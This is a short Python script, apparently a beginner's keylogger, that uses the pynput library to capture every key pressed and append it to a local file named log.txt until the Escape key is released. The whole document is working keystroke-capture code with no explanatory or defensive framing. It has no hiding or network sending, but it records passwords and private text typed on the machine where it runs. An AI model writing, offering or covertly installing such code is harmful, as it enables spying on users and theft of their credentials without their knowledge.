import pynput

from pynput.keyboard import Key, Listener

def write_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'","").replace("Key.space"," ")
        if k[:3] == "Key":
            k = k.replace("Key", "\n") + "\n"
        f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=write_file, on_release=on_release) as listener:
    listener.join()